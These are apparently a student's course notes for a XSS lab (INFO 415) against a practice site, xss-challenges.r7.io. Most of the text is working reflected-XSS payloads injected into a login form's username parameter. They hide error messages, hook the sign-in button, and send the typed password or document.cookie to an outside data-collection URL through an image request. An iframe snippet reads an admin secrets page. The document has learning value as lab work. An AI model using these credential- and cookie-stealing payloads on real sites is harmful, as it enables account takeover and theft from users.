Royce Le
INFO 415

Payload1 - 

Payload2 -
http://xss-challenges.r7.io/0/login?username=%3Cscript%3Ewindow.location.replace%28%22http%3A%2F%2Flocalhost%3A8000%2F%22%29%3B%3C%2Fscript%3E&password=hi&user_language=english

Resources:
http://stackoverflow.com/questions/4744751/how-do-i-redirect-with-javascript
-How to redirect w/ Javascript
http://stackoverflow.com/questions/9800310/add-event-handler-to-html-element-using-javascript
can you add an event handler to an input?
https://www.w3schools.com/jsref/prop_style_visibility.asp

below is your token for saving and retrieving data
go to http://r7.io/e/[token]?s= and whatever comes after the = will be saved
go to http://r7.io/e/[token] without the s parameter to retrieve the data
http://r7.io/e/J7zkgVqCiG
data will be overwritten with every save
be careful to URL encode what you save so ; & + / don't cause issues

token: J7zkgVqCiG

PoC
<script>
	i = new Image();
	i.src='http://r7.io/e/J7zkgVqCiG?s=username = ' + escape(username) + ' password = ';
	setTimeout('document.forms[0].submit();',3000);
</script> 

------------------------STUFF-----------------
<input id="button" type="submit" name="button" onclick="myFunction();" value="enter"/>
<script>function myFunction(){alert(username + password);};</script>
----------------------------------------------
<script>
	var prob = document.getElementsByClassName("problem");
	prob[0].style.display = "none";
	var errmsg = document.getElementsByClassName("error-message");
	errmsg[0].style.display = "none";
	window.onload =function (){
	var el = document.getElementById("signin-btn");
	if (el.addEventListener) {
	    el.addEventListener("click", yourFunction, false);
	} else {
	    el.attachEvent('onclick', yourFunction);
	}
	};
	function yourFunction(){
		alert(document.cookie);
		i = new Image();
		i.src='http://r7.io/e/J7zkgVqCiG?s=The password is: ' + document.cookie;
	}  
</script>
---------------------------------------------------
<iframe src="http://xss-challenges.r7.io/admin/secrets" id="gotcha" ></iframe>
<script>
	window.onload=function() {
		var iframe = document.getElementById('gotcha');
		var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
		alert(innerDoc.getElementById("secrets").innerText);
	}
</script>

PAYLOAD 1
http://xss-challenges.r7.io/0/login?username=%3Cscript%3E+%09var+prob+%3D+document.getElementsByClassName%28%22problem%22%29%3B+%09prob%5B0%5D.style.display+%3D+%22none%22%3B+%09var+errmsg+%3D+document.getElementsByClassName%28%22error-message%22%29%3B+%09errmsg%5B0%5D.style.display+%3D+%22none%22%3B+%09window.onload+%3Dfunction+%28%29%7B+%09var+el+%3D+document.getElementById%28%22signin-btn%22%29%3B+%09if+%28el.addEventListener%29+%7B+%09++++el.addEventListener%28%22click%22%2C+yourFunction%2C+false%29%3B+%09%7D+else+%7B+%09++++el.attachEvent%28%27onclick%27%2C+yourFunction%29%3B+%09%7D+%09%7D%3B+%09function+yourFunction%28%29%7B+%09%09i+%3D+new+Image%28%29%3B+%09%09i.src%3D%27http%3A%2F%2Fr7.io%2Fe%2FJ7zkgVqCiG%3Fs%3DThe+password+is%3A+%27+%2B+document.getElementById%28%27login_password%27%29.value%3B+%09%7D+++%3C%2Fscript%3E&password=hi&user_language=english

PAYLOAD 3
http://xss-challenges.r7.io/0/login?username=%3Cscript%3E+%09var+prob+%3D+document.getElementsByClassName%28%22problem%22%29%3B+%09prob%5B0%5D.style.display+%3D+%22none%22%3B+%09var+errmsg+%3D+document.getElementsByClassName%28%22error-message%22%29%3B+%09errmsg%5B0%5D.style.display+%3D+%22none%22%3B+%09window.onload+%3Dfunction+%28%29%7B+%09var+el+%3D+document.getElementById%28%22signin-btn%22%29%3B+%09if+%28el.addEventListener%29+%7B+%09++++el.addEventListener%28%22click%22%2C+yourFunction%2C+false%29%3B+%09%7D+else+%7B+%09++++el.attachEvent%28%27onclick%27%2C+yourFunction%29%3B+%09%7D+%09%7D%3B+%09function+yourFunction%28%29%7B+%09%09alert%28document.cookie%29%3B+%09%09i+%3D+new+Image%28%29%3B+%09%09i.src%3D%27http%3A%2F%2Fr7.io%2Fe%2FJ7zkgVqCiG%3Fs%3DThe+password+is%3A+%27+%2B+document.cookie%3B+%09%7D+++%3C%2Fscript%3E&password=ji&user_language=english

